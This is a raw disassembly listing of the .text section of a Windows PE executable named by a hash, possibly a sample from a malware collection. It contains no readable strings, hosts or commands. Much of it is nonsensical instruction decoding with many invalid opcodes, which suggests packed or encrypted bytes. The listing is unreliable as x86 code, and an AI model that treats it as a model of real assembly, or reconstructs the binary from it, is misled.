
0772135011da70ffb65df2fbd2f6f16ddd6ff373a13173b776a81a3fdabbef43.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	call   0x8d6880
  401009:	add    BYTE PTR [eax],al
  40100b:	add    BYTE PTR [edx],al
  40100d:	add    BYTE PTR [eax],al
  40100f:	add    BYTE PTR [ebp+0x0],cl
  401012:	add    BYTE PTR [eax],al
  401014:	add    al,ah
  401016:	add    BYTE PTR [eax],al
  401018:	add    BYTE PTR [esi+0x554d0000],ah
  40101e:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  401024:	mov    esp,ebp
  401026:	or     ah,dh
  401028:	dec    ebp
  401029:	add    bh,al
  40102b:	add    BYTE PTR [eax],cl
  40102d:	add    BYTE PTR [eax],al
  40102f:	mov    DWORD PTR [eax],0x40f44545
  401035:	cmp    BYTE PTR [eax],al
  401037:	test   DWORD PTR [ebx-0x34070b64],ecx
  40103d:	(bad)  
  40103e:	enter  0x4d45,0xbc
  401042:	mov    edi,DWORD PTR [ebx]
  401044:	hlt    
  401045:	test   ebx,ecx
  401047:	pushf  
  401048:	enter  0x4df8,0x8b
  40104c:	mov    DWORD PTR [ebp-0x20],0x890208
  401053:	inc    ebp
  401054:	inc    ebp
  401055:	cld    
  401056:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40105c:	or     BYTE PTR [ebx+0x0],dl
  40105f:	mov    ebx,0x8bd5900
  401064:	call   DWORD PTR [ecx-0x1]
  401067:	pop    es
  401068:	mov    ch,0x33
  40106a:	dec    ebx
  40106c:	(bad)  
  40106d:	mov    eax,0x72009fa4
  401072:	push   DWORD PTR [edx]
  401074:	or     BYTE PTR [eax],al
  401076:	jmp    0xff89:0x75c84d03
  40107d:	dec    ebp
  40107e:	loopne 0x401050
  401080:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  401086:	add    BYTE PTR [ebx],dh
  401088:	mov    ecx,ebx
  40108a:	hlt    
  40108b:	add    ecx,ebx
  40108d:	enter  0x899f,0x32
  401091:	dec    ebp
  401092:	add    ecx,eax
  401094:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40109a:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4010a1:	xor    ecx,ebx
  4010a3:	retf   
  4010a4:	enter  0x4d03,0xc8
  4010a8:	mov    DWORD PTR fs:[eax],ebx
  4010ab:	lea    eax,[eax]
  4010ad:	push   esp
  4010ae:	mov    edi,edi
  4010b0:	fs (bad) 
  4010b2:	(bad)  
  4010b3:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4010b9:	push   0xffffffff
  4010bb:	and    bh,bh
  4010bd:	pop    ecx
  4010be:	inc    eax
  4010bf:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4010c5:	push   0xffffff8b
  4010c7:	pop    ecx
  4010c8:	cld    
  4010c9:	dec    ebp
  4010ca:	lea    ecx,[ecx+0x45ff08ff]
  4010d0:	mov    BYTE PTR [edx+0x1],cl
  4010d3:	add    BYTE PTR [eax],al
  4010d5:	mov    DWORD PTR [ebp+0x8],0x58008d
  4010dc:	dec    DWORD PTR [ebp-0x77]
  4010df:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4010e6:	cld    
  4010e7:	dec    ebp
  4010e8:	jne    0x40111d
  4010ea:	lea    eax,[ebx]
  4010ec:	push   eax
  4010ed:	mov    edi,edi
  4010ef:	or     BYTE PTR [ecx+0x54a845],cl
  4010f5:	add    al,ch
  4010f7:	(bad)  
  4010f8:	sub    ebp,esp
  4010fa:	add    BYTE PTR [eax],al
  4010fc:	rol    BYTE PTR [eax],0x84
  4010ff:	inc    ebp
  401100:	add    dh,BYTE PTR [esi+0x0]
  401103:	add    BYTE PTR [ebp-0x73],al
  401106:	mov    ebp,DWORD PTR [esp+edx*4]
  401109:	inc    DWORD PTR [eax]
  40110b:	lea    ecx,[ebx-0x30074f4]
  401111:	call   0x411c96
  401116:	add    BYTE PTR [ebp+0x0],cl
  401119:	jne    0x40115c
  40111b:	dec    DWORD PTR [ebx-0x76210314]
  401121:	dec    ebp
  401122:	add    DWORD PTR [ebp+0x0],esi
  401125:	(bad)  
  401126:	xchg   ebp,eax
  401127:	loopne 0x401128
  401129:	inc    eax
  40112a:	inc    DWORD PTR [eax]
  40112c:	mov    ecx,DWORD PTR [ebp-0x4]
  40112f:	xor    edx,DWORD PTR [edx+0x7201b8]
  401135:	add    BYTE PTR [edx],dl
  401137:	enter  0x4d90,0x0
  40113b:	mov    eax,DWORD PTR [eax]
  40113d:	hlt    
  40113e:	add    al,0xa5
  401140:	mov    al,0xff
  401142:	add    bh,bh
  401144:	add    BYTE PTR [ebx],dh
  401146:	inc    DWORD PTR [ebx]
  401148:	sbb    al,0x89
  40114a:	jne    0x401124
  40114c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  401152:	mov    eax,DWORD PTR [ebp-0xff0048]
  401158:	mov    DWORD PTR [eax-0x70],0xec58ed89
  40115f:	inc    DWORD PTR [ebp-0x75]
  401162:	fisttp QWORD PTR [esi+ebp*8]
  401165:	test   DWORD PTR [esi-0x1],esp
  401168:	inc    ebp
  401169:	(bad)  
  40116a:	aas    
  40116b:	inc    ebp
  40116c:	(bad)  
  40116d:	lea    edi,[esp+eiz*2-0x1]
  401171:	push   DWORD PTR [edi]
  401173:	mov    DWORD PTR ds:0x8000c7a0,edi
  401179:	mov    ebp,esp
  40117b:	cld    
  40117c:	jmp    0xdfff:0xeeff458d
  401183:	mov    bh,al
  401185:	add    DWORD PTR [eax-0x13ba1500],ecx
  40118b:	inc    DWORD PTR [ebp-0x4]
  40118e:	xlat   BYTE PTR ds:[ebx]
  40118f:	lea    edi,[edi]
  401191:	inc    edi
  401193:	jmp    FWORD PTR [eax-0x78]
  401196:	inc    DWORD PTR [ecx]
  401198:	aaa    
  401199:	add    BYTE PTR ds:0x6c00c757,bh
  40119f:	test   edi,edi
  4011a1:	pandn  mm0,mm5
  4011a4:	aas    
  4011a5:	add    bh,al
  4011a7:	mov    esi,DWORD PTR [eax-0x4]
  4011aa:	inc    DWORD PTR [eax+0xdf01ee]
  4011b0:	(bad)  
  4011b1:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4011b5:	mov    esp,ebx
  4011b7:	xchg   esp,eax
  4011b8:	rol    DWORD PTR [eax],cl
  4011ba:	(bad)  
  4011bb:	mov    edi,DWORD PTR [eax+0x3]
  4011be:	(bad)  
  4011bf:	cmp    al,0xd7
  4011c1:	dec    ebp
  4011c2:	ror    DWORD PTR [ebx+0x2ad8e8],0x0
  4011c9:	lea    ecx,[ebx-0x7f0003b4]
  4011cf:	push   edx
  4011d0:	add    DWORD PTR [ebp+0x0],edx
  4011d3:	mov    esi,DWORD PTR [eax]
  4011d5:	mov    WORD PTR [edx+0x0],gs
  4011d8:	add    BYTE PTR [ebx-0x778afc7b],cl
  4011de:	mov    eax,DWORD PTR [eax]
  4011e0:	cld    
  4011e1:	push   0x7d
  4011e3:	dec    DWORD PTR [ebx+0xd88c]
  4011e9:	push   edx
  4011ea:	mov    edx,DWORD PTR [ecx-0x4]
  4011ed:	call   DWORD PTR [eax+0x7d01fc]
  4011f3:	mov    ecx,DWORD PTR [ecx+0x509000fc]
  4011f9:	add    DWORD PTR [esi+0x0],edx
  4011fc:	test   DWORD PTR [ebp+0x75],eax
  4011ff:	jmp    0x947d:0xc7fce28b
  401206:	mov    ebp,ebx
  401208:	fcom   st(7)
  40120a:	add    bh,al
  40120c:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  401212:	add    edi,edi
  401214:	add    bh,bh
  401216:	addr16 in eax,dx
  401218:	add    dh,dl
  40121a:	push   eax
  40121b:	inc    ebp
  40121c:	push   esi
  40121d:	fisttp WORD PTR [ebx+0x4dc7f43f]
  401223:	test   BYTE PTR [ebx],dh
  401225:	(bad)  
  401226:	add    eax,0x4572c8
  40122b:	jecxz  0x4011ee
  40122d:	rol    DWORD PTR [edi+eax*8-0x22ff73ff],cl
  401234:	inc    esi
  401235:	jle    0x401237
  401237:	test   edi,eax
  401239:	jmp    esp
  40123b:	inc    DWORD PTR [eax]
  40123d:	in     eax,dx
  40123e:	add    dh,dl
  401240:	jne    0x4011c7
  401242:	mov    edi,edi
  401244:	cld    
  401245:	inc    DWORD PTR [ebp-0x14]
  401248:	mov    ebp,edx
  40124a:	mov    ah,0x85
  40124c:	add    bh,bh
  40124e:	call   0x1163d52
  401253:	enter  0x858b,0xfc
  401257:	inc    DWORD PTR [eax+0xeb01ff]
  40125d:	in     al,dx
  40125e:	xor    BYTE PTR [ebp-0xff0020],al
  401264:	mov    ebx,ebp
  401266:	cld    
  401267:	jle    0x4011f2
  401269:	mov    eax,0x50000001
  40126e:	add    DWORD PTR [ebp+0x45],eax
  401271:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  401277:	dec    DWORD PTR [ebx-0x3fd80318]
  40127d:	add    BYTE PTR [ebp-0xbf0040],dl
  401283:	inc    ebp
  401284:	das    
  401285:	mov    eax,DWORD PTR [eax]
  401287:	cld    
  401288:	push   eax
  401289:	mov    al,0x45
  40128b:	add    DWORD PTR [ebx+0x459c00],ecx
  401291:	mov    edi,edi
  401293:	mov    eax,0xe80800ff
  401298:	inc    ebp
  401299:	sub    cl,BYTE PTR [ebx-0x47000400]
  40129f:	add    al,0x1
  4012a1:	rol    BYTE PTR [eax],0x1e
  4012a4:	jne    0x4012eb
  4012a6:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4012ac:	inc    DWORD PTR [ecx]
  4012ae:	call   0x853cb3
  4012b3:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4012b9:	call   0x403cbf
  4012be:	xor    bh,bh
  4012c0:	push   edi
  4012c1:	adc    BYTE PTR [ebx-0x747423bb],al
  4012c7:	loopne 0x4012a5
  4012c9:	ret    
  4012ca:	loopne 0x40126b
  4012cc:	xor    DWORD PTR [edx],0x31
  4012cf:	cmp    edi,edi
  4012d1:	bswap  esp
  4012d3:	rol    BYTE PTR gs:[eax],0x5
  4012d7:	jmp    0x12b1421
  4012dc:	mov    eax,DWORD PTR [ebp-0x4]
  4012df:	add    BYTE PTR [eax+0xff0100],bh
  4012e5:	cld    
  4012e6:	jne    0x401365
  4012e8:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  4012ee:	lds    eax,FWORD PTR [ecx]
  4012f0:	add    BYTE PTR [eax],al
  4012f2:	push   eax
  4012f3:	cs inc ebp
  4012f5:	add    BYTE PTR [ebx+0x459850],cl
  4012fb:	mov    edi,edi
  4012fd:	test   al,0xff
  4012ff:	add    BYTE PTR [eax],cl
  401301:	inc    DWORD PTR [ebp-0x18]
  401304:	jmp    DWORD PTR [esi]
  401306:	fadd   QWORD PTR [eax]
  401308:	jge    0x401357
  40130a:	adc    BYTE PTR [ebx+0x459cb9],cl
  401310:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  401316:	lahf   
  401317:	mov    eax,0x30132
  40131c:	lea    esi,[ebp+0x2c]
  40131f:	xor    edi,edi
  401321:	(bad)  
  401322:	call   0x13f3c8f
  401327:	call   0x1343db7
  40132c:	jne    0x4012b9
  40132e:	xor    edi,esp
  401330:	add    eax,DWORD PTR [eax+0xc018d]
  401336:	push   DWORD PTR [eax]
  401338:	call   0xc93c94
  40133d:	int3   
  40133e:	inc    DWORD PTR [ebp-0x14]
  401341:	mov    ecx,DWORD PTR [ebp-0x28]
  401344:	xor    eax,DWORD PTR [eax]
  401346:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40134c:	(bad)  
  40134d:	xchg   ebp,eax
  40134e:	in     al,0xff
  401350:	add    bh,bh
  401352:	add    BYTE PTR [eax*2+0x8508b00],al
  401359:	inc    ebp
  40135a:	ret    
  40135b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff61]
  401362:	mov    edi,edi
  401364:	or     BYTE PTR [eax],cl
  401366:	inc    ebp
  401367:	test   DWORD PTR gs:[eax],eax
  40136a:	je     0x4013b1
  40136c:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  401372:	xor    edx,DWORD PTR [eax-0x73]
  401375:	push   ebp
  401376:	or     BYTE PTR [ebp+0x21007572],al
  40137c:	inc    ebp
  40137d:	in     al,dx
  40137e:	mov    ebp,DWORD PTR [eax]
  401380:	mov    esp,0x618bc345
  401385:	fmul   st,st(5)
  401387:	add    BYTE PTR [ebx],ch
  401389:	mov    eax,DWORD PTR [ebx]
  40138b:	cld    
  40138c:	loopne 0x40134e
  40138e:	inc    ebp
  40138f:	push   ebp
  401390:	cmp    ebp,eax
  401392:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  401399:	cld    
  40139a:	fadd   DWORD PTR [eax+0x3b014d]
  4013a0:	jne    0x4013d2
  4013a2:	push   0xf8898557
  4013a7:	in     al,dx
  4013a8:	jne    0x4013ef
  4013aa:	lea    eax,[ebx+0x72e8dcc8]
  4013b0:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  4013b6:	jmp    0x4013eb
  4013b8:	mov    edi,DWORD PTR [edi+0x4572bc]
  4013be:	xor    eax,edi
  4013c0:	adc    DWORD PTR [ebp-0xcd0061],0x8b9031
  4013ca:	rcl    BYTE PTR [eax-0x40],1
  4013cd:	inc    ebp
  4013ce:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  4013d6:	inc    ebp
  4013d7:	xchg   ebp,eax
  4013d8:	ud0    ebp,DWORD PTR [ebx]
  4013db:	inc    DWORD PTR [eax]
  4013dd:	jp     0x401455
  4013df:	add    BYTE PTR [edx+0x1f558050],cl
  4013e5:	mov    ecx,DWORD PTR [esp+esi*8]
  4013e8:	inc    eax
  4013e9:	retf   
  4013ea:	inc    ebp
  4013eb:	iret   
  4013ec:	jb     0x4013b6
  4013ee:	mov    eax,DWORD PTR [edi]
  4013f0:	enter  0x4545,0x1
  4013f4:	cmp    BYTE PTR [eax],al
  4013f6:	pushf  
  4013f7:	mov    ecx,DWORD PTR [ecx+0x3b4df0bc]
  4013fd:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  401404:	dec    ebp
  401405:	add    BYTE PTR [ebx],dh
  401407:	inc    ebp
  401408:	mov    DWORD PTR [ebx-0x3f601b4c],ecx
  40140e:	xor    dl,BYTE PTR [edx]
  401410:	add    eax,DWORD PTR [ebp-0x77]
  401413:	mov    eax,esp
  401415:	fmul   DWORD PTR [ebp-0x3d]
  401418:	xor    eax,DWORD PTR [ebx+eax*1+0x832899f]
  40141f:	mov    DWORD PTR [ebp-0x28],eax
  401422:	fadd   DWORD PTR [ebp-0x64]
  401425:	xor    eax,edi
  401427:	mov    ecx,0xff858db0
  40142c:	clc    
  40142d:	enter  0x4d45,0x3d
  401431:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  401438:	test   esi,edi
  40143a:	clc    
  40143b:	inc    DWORD PTR [ebp+0x45]
  40143e:	aas    
  40143f:	mov    ebx,DWORD PTR [eax+ecx*1+0x16a8c8c7]
  401446:	test   DWORD PTR [eax],edi
  401448:	clc    
  401449:	pushf  
  40144a:	inc    ebp
  40144b:	push   DWORD PTR [ecx]
  40144d:	cld    
  40144e:	pushf  
  40144f:	inc    ebp
  401450:	mov    edx,DWORD PTR [eax-0x28]
  401453:	ins    DWORD PTR es:[edi],dx
  401454:	push   ebp
  401455:	add    BYTE PTR [ebx],dh
  401457:	mov    DWORD PTR [ebx],eax
  401459:	sar    BYTE PTR [ebx],1
  40145b:	adc    BYTE PTR [edi],cl
  40145d:	dec    ebp
  40145e:	adc    al,0x8b
  401460:	add    al,dl
  401462:	jmp    0x1011632
  401467:	jb     0x4014b6
  401469:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40146f:	xor    ecx,DWORD PTR [ebp+0x3b]
  401472:	xor    ecx,DWORD PTR [edi]
  401474:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  401478:	(bad)  
  40147a:	clc    
  40147b:	enter  0x8400,0x8b
  40147f:	pop    es
  401480:	mov    al,0x0
  401482:	push   ebp
  401483:	push   cs
  401484:	xor    ecx,eax
  401486:	xor    esp,ecx
  401488:	add    ebp,DWORD PTR [eax]
  40148a:	add    esi,DWORD PTR [eax]
  40148c:	(bad)  
  40148e:	retf   0x55c8
  401491:	repnz mov eax,DWORD PTR [ebp-0x10]
  401495:	(bad)  
  401496:	cli    
  401497:	fdivr  st,st(1)
  401499:	test   DWORD PTR [eax+edi*8],ecx
  40149c:	dec    ebp
  40149d:	inc    ebp
  40149e:	xor    edi,DWORD PTR [eax-0x7167afd]
  4014a4:	add    BYTE PTR [ebp+0x0],al
  4014a7:	mov    ecx,DWORD PTR [ebp-0x28]
  4014aa:	mov    ecx,ebx
  4014ac:	clc    
  4014ad:	jne    0x40147a
  4014af:	mov    esi,0xd672d3
  4014b4:	into   
  4014b5:	into   
  4014b6:	scas   eax,DWORD PTR es:[edi]
  4014b7:	dec    ebp
  4014b8:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  4014be:	sub    ecx,esi
  4014c0:	cmp    ecx,DWORD PTR [ebp+0x77]
  4014c3:	(bad)  
  4014c4:	mov    edi,eax
  4014c6:	mov    al,0x85
  4014c8:	mov    eax,edi
  4014ca:	add    BYTE PTR [ebp-0x75],al
  4014cd:	cmp    ah,BYTE PTR [esp+ebx*4-0x47cc38ab]
  4014d4:	xor    eax,DWORD PTR [ebp+0x4503f803]
  4014da:	(bad)  
  4014dc:	retf   0x559c
  4014df:	(bad)  
  4014e0:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  4014e7:	inc    ebp
  4014e8:	add    eax,0xeb9c4d3e
  4014ed:	(bad)  
  4014ee:	mov    ecx,esp
  4014f0:	lods   al,BYTE PTR ds:[esi]
  4014f1:	test   DWORD PTR [ebp-0x8],edx
  4014f4:	xor    ecx,DWORD PTR [ebp+0x33]
  4014f7:	mov    eax,DWORD PTR [ebx]
  4014f9:	lock add ecx,ebx
  4014fc:	bswap  esi
  4014fe:	retf   0x55d1
  401501:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  401507:	jmp    0x401502
  401509:	add    BYTE PTR ds:0xebc44d8b,al
  40150f:	push   ebp
  401510:	mov    ebp,DWORD PTR [ebx]
  401512:	test   al,0x8b
  401514:	push   ebp
  401515:	clc    
  401516:	xor    ecx,ebx
  401518:	xor    ecx,esi
  40151a:	add    edx,ecx
  40151c:	add    eax,DWORD PTR [edx+0xca010f]
  401522:	push   ebp
  401523:	dec    ebp
  401524:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40152a:	stc    
  40152b:	rol    DWORD PTR ds:0xebce4dd6,cl
  401531:	scas   eax,DWORD PTR es:[edi]
  401532:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  401538:	xor    ebp,DWORD PTR [ebx]
  40153a:	xor    edi,DWORD PTR [ebx]
  40153c:	add    esi,DWORD PTR [edi+0x3]
  40153f:	mov    ecx,DWORD PTR [edi]
  401541:	clc    
  401542:	retf   0x55cb
  401545:	into   
  401546:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40154d:	mov    eax,0x3376554d
  401552:	mov    esi,DWORD PTR [ebx]
  401554:	int3   
  401555:	add    edx,DWORD PTR [ebp+0x3]
  401558:	xor    ecx,DWORD PTR [edi]
  40155a:	xor    ecx,edx
  40155c:	add    edx,DWORD PTR [ebp+0x3]
  40155f:	mov    ecx,DWORD PTR [edi]
  401561:	lock retf 0x4dfa
  401565:	stc    
  401566:	mov    ecx,DWORD PTR [eax]
  401568:	or     BYTE PTR [ebp+0x4d],cl
  40156b:	jmp    0x10415fb
  401570:	dec    ebp
  401571:	dec    ebp
  401572:	(bad)  
  401573:	mov    ebx,esp
  401575:	clc    
  401576:	test   ebx,ecx
  401578:	clc    
  401579:	ror    DWORD PTR [ebp-0x2a],cl
  40157c:	mov    esi,ecx
  40157e:	call   0x3acb5b32
  401583:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40158a:	retf   
  40158b:	ja     0x40155b
  40158d:	mov    ebp,DWORD PTR [eax-0x48]
  401590:	dec    ebp
  401591:	xor    ecx,DWORD PTR [di+0x3]
  401595:	mov    esp,esp
  401597:	clc    
  401598:	push   ebp
  401599:	retf   
  40159a:	mov    dl,bl
  40159c:	adc    esi,edx
  40159e:	jb     0x40156e
  4015a0:	add    BYTE PTR [edi-0x3b7474b3],ch
  4015a6:	call   0x4d6be128
  4015ab:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  4015b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015b2:	lahf   
  4015b3:	inc    ebp
  4015b4:	xor    cl,BYTE PTR [ebp-0x78]
  4015b7:	mov    edx,edi
  4015b9:	clc    
  4015ba:	dec    ebp
  4015bb:	retf   
  4015bc:	mov    edx,ebx
  4015be:	call   0x560ee999
  4015c3:	scas   eax,DWORD PTR es:[edi]
  4015c4:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  4015ca:	lahf   
  4015cb:	sub    esi,DWORD PTR [edx]
  4015cd:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  4015d3:	lods   al,BYTE PTR ds:[esi]
  4015d4:	xor    esp,DWORD PTR [ebx]
  4015d6:	add    ecx,DWORD PTR [ebp-0x1c]
  4015d9:	mov    edi,DWORD PTR [ebp-0x8]
  4015dc:	mov    bl,cl
  4015de:	cmp    dl,bl
  4015e0:	jb     0x4015b0
  4015e2:	add    dh,dl
  4015e4:	dec    ebp
  4015e5:	scas   eax,DWORD PTR es:[edi]
  4015e6:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  4015ec:	shr    DWORD PTR [ebx],cl
  4015ee:	into   
  4015ef:	cmp    edx,esi
  4015f1:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  4015f7:	dec    ebp
  4015f8:	dec    ebp
  4015f9:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  4015ff:	retf   
  401600:	xor    edx,esi
  401602:	add    ecx,esi
  401604:	imul   ecx,edx
  401607:	mov    DWORD PTR [ebp+0x8],edx
  40160a:	xor    ecx,DWORD PTR [ebp+0x2b]
  40160d:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  401613:	add    esi,DWORD PTR [ebx]
  401615:	mov    ah,0x3
  401617:	inc    ebp
  401618:	(bad)  
  40161b:	pushf  
  40161c:	jge    0x4015a7
  40161e:	xor    ebx,eax
  401620:	sub    eax,DWORD PTR [ebp-0x73]
  401623:	(bad)  
  401624:	cmp    al,al
  401626:	jb     0x4015ad
  401628:	add    al,bh
  40162a:	ror    DWORD PTR [ebp-0x7a],1
  40162d:	xor    edi,edi
  40162f:	add    edi,edi
  401631:	jmp    0x401680
  401633:	mov    ecx,DWORD PTR [ebx-0x34341324]
  401639:	dec    ebp
  40163a:	into   
  40163b:	mov    ebp,DWORD PTR [edi-0x23737428]
  401641:	lahf   
  401642:	shl    DWORD PTR [edx],cl
  401644:	retf   0x5588
  401647:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40164d:	add    eax,DWORD PTR [eax]
  40164f:	in     al,0x4d
  401651:	push   ebp
  401652:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  401658:	popa   
  401659:	add    ch,cl
  40165b:	dec    ebp
  40165c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  401662:	dec    ebp
  401663:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  401669:	jge    0x401639
  40166b:	mov    BYTE PTR [edi+0xf723b3a],ch
  401671:	add    cl,dh
  401673:	dec    ebp
  401674:	dec    DWORD PTR [ebx-0x2c032375]
  40167a:	adc    BYTE PTR [ebp+0x1],0x8b
  40167e:	add    al,bl
  401680:	jge    0x40160e
  401682:	push   0xffffff9f
  401684:	push   0x8b3032
  401689:	shl    BYTE PTR [ebp+0x55],0x6a
  40168d:	xor    edi,edi
  40168f:	xor    edx,DWORD PTR [ebx+eax*1]
  401692:	inc    ebp
  401693:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  401699:	dec    ebp
  40169a:	or     BYTE PTR [ecx+0x4dc8e483],cl
  4016a0:	jbe    0x40162d
  4016a2:	mov    ebp,esp
  4016a4:	ror    bl,1
  4016a6:	enter  0x14ce,0xaf
  4016aa:	dec    DWORD PTR [ebx-0x2cef17f8]
  4016b0:	push   ebp
  4016b1:	retf   0x5540
  4016b4:	push   ebp
  4016b5:	mov    esi,DWORD PTR [edx-0x1c]
  4016b8:	mov    edx,ebx
  4016ba:	cld    
  4016bb:	(bad)  
  4016bc:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  4016c3:	sti    
  4016c4:	add    dh,cl
  4016c6:	push   0xffffff94
  4016c8:	call   FWORD PTR [edi+0x3b5032d0]
  4016ce:	mov    ecx,DWORD PTR [edi]
  4016d0:	int3   
  4016d1:	pop    esi
  4016d2:	inc    ebp
  4016d3:	dec    DWORD PTR [ecx+0x45e8c88b]
  4016d9:	push   ebp
  4016da:	xor    esi,DWORD PTR [ebx]
  4016dc:	mov    DWORD PTR [ebx],0xcace0f9c
  4016e2:	aas    
  4016e3:	push   ebp
  4016e4:	inc    ebp
  4016e5:	xor    eax,esi
  4016e7:	add    eax,esi
  4016e9:	mov    eax,DWORD PTR [ebx]
  4016eb:	(bad)  
  4016ec:	jmp    0x40167a
  4016ee:	mov    bl,BYTE PTR [edi-0x7674cdfb]
  4016f4:	rol    ah,1
  4016f6:	mov    esi,0xf133104d
  4016fb:	mov    edx,0xff348d80
  401700:	mov    dh,0xd1
  401702:	cmp    edx,DWORD PTR [ebp+0xf]
  401705:	mov    eax,DWORD PTR [edx-0x20]
  401708:	add    BYTE PTR [ebp-0x75],bh
  40170b:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  401712:	lahf   
  401713:	retf   0x8632
  401716:	cmp    ebp,0x8
  401719:	call   ebx
  40171b:	inc    ebp
  40171c:	inc    ebp
  40171d:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  401723:	mov    edi,DWORD PTR [eax]
  401725:	enter  0x49c,0xc7
  401729:	add    al,al
  40172b:	add    bl,al
  40172d:	(bad)  
  40172e:	clc    
  40172f:	enter  0x45,0x38
  401733:	push   eax
  401734:	pushf  
  401735:	mov    edi,eax
  401737:	int3   
  401738:	or     al,al
  40173a:	test   DWORD PTR [edi],edi
  40173c:	clc    
  40173d:	gs inc ebp
  40173f:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  401745:	push   ss
  401746:	xor    ecx,DWORD PTR [ebp+0x3]
  401749:	sub    edx,DWORD PTR [ecx-0x76]
  40174c:	dec    ebp
  40174d:	add    DWORD PTR [ebx+0x88d845],ecx
  401753:	mov    esi,DWORD PTR [ebx]
  401755:	or     BYTE PTR [ebx],al
  401757:	cmp    edx,DWORD PTR [ecx-0x38]
  40175a:	dec    ebp
  40175b:	out    dx,eax
  40175c:	xor    eax,DWORD PTR [ebp+0x3]
  40175f:	mov    edx,DWORD PTR [ecx-0x28]
  401762:	dec    ebp
  401763:	add    BYTE PTR [ebx],dh
  401765:	push   0x518003
  40176a:	push   eax
  40176b:	add    BYTE PTR [ebx-0x300748b],cl
  401771:	sbb    BYTE PTR [ebp+0x45],cl
  401774:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40177a:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  401780:	dec    ebp
  401781:	inc    ebp
  401782:	xor    eax,esi
  401784:	add    eax,esi
  401786:	push   ecx
  401787:	(bad)  
  401788:	dec    ebp
  401789:	mov    al,ds:0x35e03dff
  40178e:	retf   
  40178f:	(bad)  
  401790:	into   
  401791:	sub    bh,bh
  401793:	dec    esp
  401794:	adc    al,0x9c
  401796:	inc    ebp
  401797:	push   ebp
  401798:	test   DWORD PTR [edi],ecx
  40179a:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab5ff80]
  4017a1:	jmp    0xc9b926b5
  4017a6:	add    cl,dl
  4017a8:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4017b2:	cmp    cl,BYTE PTR [ebp+0x728b089c]
  4017b8:	rol    BYTE PTR [eax],0x59
  4017bb:	clc    
  4017bc:	popa   
  4017bd:	jb     0x4017c6
  4017bf:	mov    eax,DWORD PTR [ebp-0x30]
  4017c2:	xor    al,0x40
  4017c4:	sub    al,0xc7
  4017c6:	mov    ah,ch
  4017c8:	add    DWORD PTR [ebp+0x4534f845],eax
  4017ce:	sub    al,0x89
  4017d0:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  4017d7:	mov    ch,0xff
  4017d9:	clc    
  4017da:	add    DWORD PTR [ebp+0x60],0x3c
  4017de:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  4017e5:	inc    ebp
  4017e6:	dec    DWORD PTR [ebx-0x341ff701]
  4017ec:	test   esi,ecx
  4017ee:	dec    DWORD PTR [ebx-0x7f8a3301]
  4017f4:	push   eax
  4017f5:	add    DWORD PTR [ebp+0x0],eax
  4017f8:	dec    ebx
  4017fa:	or     al,0xce
  4017fc:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  401803:	into   
  401804:	add    BYTE PTR [ebx-0x34ff1400],cl
  40180a:	mov    esi,ecx
  40180c:	sar    bh,0x45
  40180f:	adc    al,0x8b
  401811:	clc    
  401812:	fadd   DWORD PTR [ebp+0x0]
  401815:	mov    ebp,DWORD PTR [edx+0x8]
  401818:	push   edi
  401819:	adc    BYTE PTR [eax+0x1],0x83
  40181d:	add    al,al
  40181f:	retf   
  401820:	mov    ecx,esi
  401822:	cld    
  401823:	mov    eax,DWORD PTR [eax+0xcb01cc]
  401829:	into   
